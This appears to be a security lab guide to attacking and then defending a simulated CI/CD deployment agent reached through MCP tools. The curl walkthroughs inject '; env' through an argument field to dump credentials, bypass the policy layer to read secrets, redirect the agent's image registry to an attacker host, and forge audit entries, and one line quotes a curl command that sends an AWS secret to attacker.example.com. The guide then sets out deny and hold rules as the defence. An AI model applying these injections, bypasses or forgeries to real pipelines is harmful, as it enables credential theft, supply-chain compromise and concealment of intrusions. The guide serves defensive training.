# Campaign B: The CI/CD Pipeline Agent

*Transports: B, D | Lanes: 3 | Labs: 4 | Time: ~75 min*

---

## Deployment Context

PlatformCo uses an automated deployment agent that runs on every merge to
`main`. The agent pulls the new code, runs `docker build`, calls a Helm
deployment API, and writes an audit entry. No human is in the loop (Lane 3 —
machine identity, no human principal). The blast radius is production
infrastructure.

The agent has a machine identity issued by Teleport's `tbot`, a shell
execution capability for the Docker build step, and direct HTTP access to the
Helm API server for deployments. The agent also writes its own audit entries.

This is the deployment architecture most teams have in place. Almost none of
them have threat-modeled the agent.

---

## Architecture

```
Git Merge Event (Lane 3 — no human in loop)
    │
    │  Trigger
    ▼
CI/CD Pipeline Agent (brain-gateway)
    ├── subprocess.invoke_worker      ← shells out for docker build (Transport D)
    ├── agent_http_bypass.call_direct ← calls Helm API directly over HTTP (Transport B)
    ├── config.read_agent_config      ← reads/writes agent configuration (Transport A)
    └── attribution.submit_action     ← writes audit log entries (Transport A)
```

**Identity lane:** Lane 3 — machine identity only. The agent's tbot
certificate is the only credential. There is no human to alert, approve, or
catch anomalies in real time.

---

## Threat Model

| Step | Lab | Threat | OWASP MCP |
|------|-----|--------|-----------|
| 1 | `subprocess_lab` | Dockerfile `RUN` step inherits CI agent's env vars (AWS keys, deploy tokens) | MCP04 |
| 2 | `agent_http_bypass_lab` | Agent calls Helm HTTP API directly, bypassing MCP and nullfield controls | MCP05 |
| 3 | `config_lab` | Attacker tampers with agent config to redirect image pulls to malicious registry | MCP09 |
| 4 | `attribution_lab` | Audit entries forged to attribute malicious deployment to a different identity | MCP22 |

---

## Attack Walkthrough

### Step 1 — Credential Inheritance via Subprocess (`subprocess_lab`)

```bash
curl -sf http://localhost:8080/config \
  -H 'Content-Type: application/json' \
  -d '{"difficulty": "easy"}'

# The agent invokes docker build (simulated). A malicious Dockerfile
# embeds a RUN step that dumps the parent process environment.
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
    "params": {
      "name": "subprocess.invoke_worker",
      "arguments": {
        "operation": "build",
        "extra_args": "; env"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
stdout=d.get('stdout','')
print('AWS key leaked:', 'MOCK_AWS_SECRET_ACCESS_KEY' in stdout)
print('Deploy token leaked:', 'MOCK_DEPLOY_TOKEN' in stdout)
"
```

**What you see on easy:** The subprocess inherits the full parent environment
including `MOCK_AWS_SECRET_ACCESS_KEY`, `MOCK_DEPLOY_TOKEN`, and
`MOCK_DB_PASSWORD`. Any `RUN` step in the Dockerfile can read and exfiltrate
these values.

**Real-world equivalent:** This is exactly what happens when GitHub Actions
injects `GITHUB_TOKEN` and AWS credentials into the runner environment and
a malicious dependency runs `curl $AWS_SECRET_ACCESS_KEY attacker.example.com`.

---

### Step 2 — HTTP Bypass (Transport B): Call Helm API Directly (`agent_http_bypass_lab`)

```bash
# The agent calls the internal deployment API directly over HTTP,
# bypassing the MCP layer and any nullfield policy.
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 2, "method": "tools/call",
    "params": {
      "name": "agent_http_bypass.call_direct",
      "arguments": {
        "resource": "/internal/secrets",
        "agent_id": "ci-pipeline-agent"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('authorized:', d.get('authorized'))
print('mcp_bypassed:', d.get('_mcp_bypassed'))
print('data keys:', list(d.get('data',{}).keys()))
"
```

**What you see:** `authorized: True`, `mcp_bypassed: True`, and the internal
secrets (including `db_password` and `api_signing_key`) are returned. The
request never crossed the nullfield policy layer.

**Key insight:** nullfield protects the MCP entry point. The raw HTTP surface
of the tool server is a separate attack surface. Network-layer controls
(firewall rules, service mesh) are required to close it.

---

### Step 3 — Agent Config Tampering (`config_lab`)

```bash
# Read current agent config to understand the attack surface
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 3, "method": "tools/call",
    "params": {
      "name": "config.read_agent_config",
      "arguments": {"config_key": "image_registry"}
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('config value:', d.get('value'))
print('tamper_risk:', d.get('_tamper_risk'))
"

# On easy: write a malicious registry endpoint into the config
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 4, "method": "tools/call",
    "params": {
      "name": "config.write_agent_config",
      "arguments": {
        "config_key": "image_registry",
        "value": "malicious-registry.attacker.example.com"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('written:', d.get('written'))
print('validation_applied:', d.get('_validation_applied'))
"
```

**What you see on easy:** The registry endpoint is overwritten without
validation. All subsequent docker pulls use the attacker's registry, injecting
malicious images into every production deployment.

---

### Step 4 — Audit Log Forgery (`attribution_lab`)

```bash
# Submit a forged audit entry attributing the malicious deployment
# to a legitimate service account
curl -sf http://localhost:8080/mcp \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0", "id": 5, "method": "tools/call",
    "params": {
      "name": "attribution.submit_action",
      "arguments": {
        "action": "deploy",
        "claimed_identity": "ci-svc-legitimate@company.com",
        "resource": "prod-api:v2.3.1"
      }
    }
  }' | python3 -c "
import sys,json
r=json.load(sys.stdin)
d=json.loads(r['result']['content'][0]['text'])
print('accepted:', d.get('accepted'))
print('identity_verified:', d.get('_identity_verified'))
print('forgery_detected:', d.get('_forgery_detected'))
"
```

**What you see on easy:** The forged attribution is accepted. The audit trail
now shows the malicious deployment was performed by a legitimate service
account. Incident response will be chasing the wrong actor.

---

## Scanning with mcpnuke

```bash
# Baseline scan — no policy applied
mcpnuke scan http://localhost:8080 \
  --output json \
  --label "cicd-agent-baseline" \
  | python3 -c "
import sys, json
findings = json.load(sys.stdin)['findings']
for f in sorted(findings, key=lambda x: x['severity'], reverse=True):
    print(f['severity'].upper(), f['threat_id'], '-', f['title'])
"
```

**Expected findings:**

```
CRITICAL MCP-T34  Subprocess Credential Inheritance
CRITICAL MCP-T37  Agent HTTP Bypass — Direct Transport B Access
HIGH     MCP-T09  Agent Config Tampering
HIGH     MCP-T22  Execution Context Forgery
MEDIUM   MCP-T18  Bot Identity Theft via tbot Credential Exposure
```

---

## Defending with nullfield

```yaml
apiVersion: nullfield.io/v1alpha1
kind: NullfieldPolicy
metadata:
  name: cicd-pipeline-policy
  namespace: camazotz
spec:
  rules:
    # Require machine identity for all CI/CD tools (Lane 3 enforcement)
    - action: DENY
      match:
        tool: "subprocess.*"
        identity:
          lane_not: 3
      reason: "Subprocess tools require machine identity (Lane 3)."

    # Allowlist subprocess operations — no arbitrary shell commands
    - action: SCOPE
      match:
        tool: "subprocess.invoke_worker"
      scope:
        operations: ["build", "test", "list"]
      reason: "Subprocess operations restricted to explicit allowlist."

    # Block direct HTTP access to internal resources
    - action: DENY
      match:
        tool: "agent_http_bypass.*"
      reason: "Direct HTTP bypass not permitted. Use MCP transport layer."

    # Prevent agent config writes — config changes require human approval
    - action: HOLD
      match:
        tool: "config.write_agent_config"
      reason: "Agent config changes require out-of-band human approval."

    # Attribution must be cryptographically verified
    - action: DENY
      match:
        tool: "attribution.submit_action"
        identity:
          unverified: true
      reason: "Audit entries require verified machine identity."
```

---

## Validation

```bash
# Set medium difficulty — partial controls in place
curl -sf http://localhost:8080/config -H 'Content-Type: application/json' \
  -d '{"difficulty": "medium"}'

# Full campaign loop — scan, apply pre-authored policy, re-scan, diff
# (uses kube/policies/cicd-pipeline-agent.yaml — no policy generation step)
K8S_HOST=192.168.1.85 make campaign SCENARIO=cicd-pipeline-agent

# Preview only (no apply)
K8S_HOST=192.168.1.85 make campaign-print SCENARIO=cicd-pipeline-agent

# Or use the raw feedback loop if you prefer generated policy
K8S_HOST=192.168.1.85 make feedback-loop-apply
```

**Expected result:** Subprocess with `extra_args` injection is blocked by the
SCOPE rule. `agent_http_bypass.*` calls return DENY. Config write is HOLDed.
The `attribution.submit_action` without a verified identity is DENY.

The subprocess `env` dump no longer includes production secrets because the
SCOPE rule restricts the operation allowlist.

---

## Real-World Takeaways

- **Your CI/CD agent's environment is its attack surface.** Any secret injected as an env var can be exfiltrated by any `RUN` step in any Dockerfile it processes. Use curated minimal environments; never pass production secrets to build agents.
- **nullfield only protects the MCP port.** If the tool server also binds on a raw HTTP port (common for health checks, admin APIs), that surface needs network-layer controls.
- **Machine agents that write their own audit logs are self-auditing.** Attribution must be cryptographically bound to the machine identity, not self-reported. Teleport tbot certificates are the right tool for Lane 3 attribution.
- **Config writes are deployment-equivalent operations.** Treat `config.write_agent_config` with the same access control rigor you apply to `kubectl apply`. HOLD → human approval is the minimum.
- **Lane 3 pipelines have no human to catch anomalies.** The detection window is the audit log. If the audit log can be forged (step 4), you are blind. Enforce cryptographic attribution before anything else.
